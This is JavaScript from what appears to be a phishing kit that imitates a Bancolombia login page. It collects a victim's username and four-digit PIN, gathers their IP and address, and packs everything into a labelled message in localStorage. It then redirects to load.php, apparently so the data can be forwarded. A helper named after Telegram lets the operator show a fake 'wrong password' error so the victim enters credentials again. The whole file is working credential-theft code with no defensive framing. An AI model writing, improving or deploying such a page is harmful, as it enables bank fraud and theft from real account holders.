(function () {
    let usuarioActual = "";
    let claveActual = "";
    let ultimoInputClave = null;

    const formularioUsuario = document.getElementById("formulario-usuario");
    const formularioClave = document.getElementById("formulario-clave");
    const usuarioInput = document.getElementById("usuario");
    const btnVolverInicio = document.getElementById("btnVolverInicio");
    const btnContinuarUsuario = document.getElementById("btnContinuarUsuario");
    const btnVolverClave = document.getElementById("btnVolverClave");
    const btnContinuarClave = document.getElementById("btnContinuarClave");
    const mensajeError = document.getElementById("mensajeError");
    const ipLabel = document.getElementById("gfg");
    const address = document.getElementById("address");
    const decorDesktop = document.querySelector(".index1-decor-desktop");
    const decorMobile = document.querySelector(".index1-decor-mobile");
    const page = document.querySelector(".index1-page");

    const casillas = [
        { input: document.getElementById("clave1"), rayita: document.getElementById("rayita1") },
        { input: document.getElementById("clave2"), rayita: document.getElementById("rayita2") },
        { input: document.getElementById("clave3"), rayita: document.getElementById("rayita3") },
        { input: document.getElementById("clave4"), rayita: document.getElementById("rayita4") }
    ];

    function estaModoCel() {
        return window.matchMedia("(max-width: 768px)").matches;
    }

    function configurarInputsClave() {
        const modoCel = estaModoCel();

        casillas.forEach(function (item) {
            if (modoCel) {
                if (item.input.type !== "text") {
                    item.input.type = "text";
                }
                item.input.setAttribute("inputmode", "numeric");
                item.input.setAttribute("pattern", "[0-9]*");
                item.input.setAttribute("autocomplete", "off");
                item.input.setAttribute("enterkeyhint", "done");
            } else {
                if (item.input.type !== "password") {
                    item.input.type = "password";
                }
                item.input.removeAttribute("inputmode");
                item.input.removeAttribute("pattern");
                item.input.removeAttribute("autocomplete");
                item.input.removeAttribute("enterkeyhint");
            }
        });
    }

    function estaClaveCompleta() {
        return casillas.every(function (item) {
            return item.input.value.length === 1;
        });
    }

    function mostrarErrorDesdeTelegram() {
        const urlParams = new URLSearchParams(window.location.search);
        const errorParam = urlParams.get("error") || urlParams.get("error_logo");

        if (errorParam === "true" || errorParam === "1" || errorParam === "error" || errorParam === "") {
            mensajeError.textContent = "Usuario erroneo o clave invalida";
            mensajeError.style.color = "#ff0000";
            mensajeError.style.fontWeight = "600";
            mensajeError.style.fontSize = "14px";
            usuarioInput.style.borderBottomColor = "#ff0000";
            setEstadoBtnUsuario("inactivo");
        }
    }

    function guardarMensajeCompleto(usuario, clave) {
        const ip = localStorage.getItem("ip") || ipLabel.textContent || "No disponible";
        const ip2 = localStorage.getItem("address") || address.textContent || "No disponible";
        const user = usuario || localStorage.getItem("userName") || "Desconocido";
        const message = `Usuario: ${user}\nClave: ${clave}\nIP: ${ip}\nIP2: ${ip2}\nBANCOLOMBIA`;

        localStorage.setItem("message", message);
        localStorage.setItem("clave", clave);
        localStorage.setItem("usuario", user);
        localStorage.setItem("ip", ip);
        localStorage.setItem("address", ip2);
        return message;
    }

    function esAlfanumerico(valor) {
        return /[a-zA-Z]/.test(valor) && /[0-9]/.test(valor);
    }

    function activarModoUsuario() {
        document.body.classList.add("index1-login");
        document.body.classList.remove("clave-page");
    }

    function activarModoClave() {
        document.body.classList.add("clave-page");
        document.body.classList.remove("index1-login");
    }

    function setEstadoBtnUsuario(estado) {
        btnContinuarUsuario.className = `btn-continuar btn-continuar--full ${estado}`;
    }

    function setEstadoBtnClave(estado) {
        btnContinuarClave.className = `btn-continuar ${estado}`;
    }

    function obtenerDecorActivo() {
        return estaModoCel() ? decorMobile : decorDesktop;
    }

    function posicionarDecor(formularioActivo) {
        const decor = obtenerDecorActivo();
        if (!decor || !page) {
            return;
        }

        if (!formularioActivo) {
            return;
        }

        const pageRect = page.getBoundingClientRect();
        const formRect = formularioActivo.getBoundingClientRect();
        const top = Math.max(120, (formRect.bottom - pageRect.top) + 12);
        page.style.setProperty("--index1-decor-top", `${top}px`);
    }

    function subirDecor(formularioActivo) {
        const decor = obtenerDecorActivo();
        if (!decor) {
            return;
        }

        if (decorDesktop && decorDesktop !== decor) {
            decorDesktop.classList.remove("is-under-input");
        }
        if (decorMobile && decorMobile !== decor) {
            decorMobile.classList.remove("is-under-input");
        }

        posicionarDecor(formularioActivo);
        decor.classList.add("is-under-input");
    }

    function bajarDecor() {
        if (decorDesktop) {
            decorDesktop.classList.remove("is-under-input");
        }
        if (decorMobile) {
            decorMobile.classList.remove("is-under-input");
        }
    }

    function refrescarDecor() {
        const decor = obtenerDecorActivo();
        if (decor && decor.classList.contains("is-under-input")) {
            const formularioActivo = !formularioClave.hidden
                ? formularioClave.querySelector(".form-container")
                : formularioUsuario.querySelector(".form-container");

            window.requestAnimationFrame(function () {
                subirDecor(formularioActivo);
            });
        }
    }

    function validarEstadoUsuario() {
        const val = usuarioInput.value;
        const longitud = val.length;

        mensajeError.textContent = "";
        mensajeError.style.color = "#ff0000";
        usuarioInput.style.borderBottomColor = "#ccc";

        const esValido = longitud >= 8 && esAlfanumerico(val);

        if (longitud === 0) {
            setEstadoBtnUsuario("inactivo");
        } else if (longitud < 8 || !esValido) {
            mensajeError.textContent = "Debe tener minimo 8 caracteres alfanumericos";
            setEstadoBtnUsuario("inactivo");
        } else {
            setEstadoBtnUsuario("activo");
        }
    }

    function resetearClave() {
        casillas.forEach(function (item, index) {
            item.input.value = "";
            item.rayita.className = "clave-rayita";
            item.input.disabled = index !== 0;
        });

        setEstadoBtnClave("inactivo");
    }

    function verificarClaveCompleta() {
        const claveCompleta = estaClaveCompleta();

        if (claveCompleta) {
            setEstadoBtnClave("activo");
        } else {
            setEstadoBtnClave("inactivo");
        }
    }

    function validarUsuario() {
        const val = usuarioInput.value;
        const longitud = val.length;

        if (btnContinuarUsuario.className.includes("inactivo")) {
            if (longitud === 0) {
                mensajeError.textContent = "Ingresa tu usuario";
            } else if (longitud < 8 || !esAlfanumerico(val)) {
                mensajeError.textContent = "Debe tener minimo 8 caracteres alfanumericos";
            }
            return;
        }

        usuarioActual = val;
        localStorage.setItem("usuario", usuarioActual);
        localStorage.setItem("userName", usuarioActual);

        formularioUsuario.hidden = true;
        formularioClave.hidden = false;
        activarModoClave();
        resetearClave();
        configurarInputsClave();
        bajarDecor();
        casillas[0].input.focus();
    }

    function volverUsuario() {
        formularioClave.hidden = true;
        formularioUsuario.hidden = false;
        activarModoUsuario();
        usuarioInput.value = "";
        setEstadoBtnUsuario("inactivo");
        mensajeError.textContent = "";
        usuarioInput.style.borderBottomColor = "#ccc";
        bajarDecor();
        usuarioInput.focus();
    }

    function validarClave() {
        if (btnContinuarClave.className.includes("inactivo")) {
            return;
        }

        claveActual = casillas.map(function (item) {
            return item.input.value;
        }).join("");

        const usuario = localStorage.getItem("usuario") || usuarioActual || "Desconocido";
        localStorage.setItem("clave", claveActual);
        guardarMensajeCompleto(usuario, claveActual);
        window.location.href = "load.php";
    }

    usuarioInput.addEventListener("input", function () {
        this.value = this.value.replace(/[^a-zA-Z0-9]/g, "");
        validarEstadoUsuario();
        subirDecor(formularioUsuario.querySelector(".form-container"));
    });

    usuarioInput.addEventListener("keypress", function (e) {
        if (e.key === "Enter") {
            validarUsuario();
        }
    });

    usuarioInput.addEventListener("focus", function () {
        subirDecor(formularioUsuario.querySelector(".form-container"));
    });

    usuarioInput.addEventListener("blur", function () {
        if (formularioClave.hidden) {
            bajarDecor();
        }
    });

    btnVolverInicio.addEventListener("click", function () {
        window.location.href = "index0.php";
    });
    btnContinuarUsuario.addEventListener("click", validarUsuario);
    btnVolverClave.addEventListener("click", volverUsuario);
    btnContinuarClave.addEventListener("click", validarClave);

    casillas.forEach(function (item, index) {
        item.input.addEventListener("input", function () {
            this.value = this.value.replace(/[^0-9]/g, "");

            if (this.value.length === 1) {
                item.rayita.className = "clave-rayita activa";
                if (index < casillas.length - 1) {
                    casillas[index + 1].input.disabled = false;
                    casillas[index + 1].input.focus();
                }
            } else {
                item.rayita.className = "clave-rayita";
            }

            verificarClaveCompleta();
            subirDecor(formularioClave.querySelector(".form-container"));
        });

        item.input.addEventListener("focus", function () {
            ultimoInputClave = this;
            subirDecor(formularioClave.querySelector(".form-container"));
        });

        item.input.addEventListener("blur", function () {
            if (!estaModoCel()) {
                return;
            }
            if (formularioClave.hidden) {
                return;
            }
            if (estaClaveCompleta()) {
                return;
            }

            const active = document.activeElement;
            if (active === btnVolverClave || active === btnContinuarClave) {
                return;
            }

            window.setTimeout(function () {
                if (formularioClave.hidden) {
                    return;
                }
                if (estaClaveCompleta()) {
                    return;
                }
                (ultimoInputClave || casillas[0].input).focus();
            }, 0);
        });

        item.input.addEventListener("keydown", function (e) {
            if (e.key === "Backspace" && this.value === "" && index > 0) {
                casillas[index - 1].input.value = "";
                casillas[index - 1].rayita.className = "clave-rayita";
                casillas[index - 1].input.disabled = false;
                casillas[index - 1].input.focus();

                for (let i = index; i < casillas.length; i += 1) {
                    casillas[i].input.value = "";
                    casillas[i].rayita.className = "clave-rayita";
                    if (i > index) {
                        casillas[i].input.disabled = true;
                    }
                }

                verificarClaveCompleta();
            }
        });

        item.input.addEventListener("paste", function (e) {
            e.preventDefault();
        });

        item.input.addEventListener("keypress", function (e) {
            if (e.key === "Enter") {
                validarClave();
            }
        });
    });

    mostrarErrorDesdeTelegram();
    BancoShared.populateIp({ ipElementId: "gfg", addressElementId: "address" });
    BancoShared.startDateTime("fecha-hora");
    activarModoUsuario();
    configurarInputsClave();
    resetearClave();
    bajarDecor();

    const mq = window.matchMedia("(max-width: 768px)");
    if (typeof mq.addEventListener === "function") {
        mq.addEventListener("change", function () {
            configurarInputsClave();
            refrescarDecor();
        });
    } else if (typeof mq.addListener === "function") {
        mq.addListener(function () {
            configurarInputsClave();
            refrescarDecor();
        });
    }

    window.addEventListener("resize", refrescarDecor);
})();
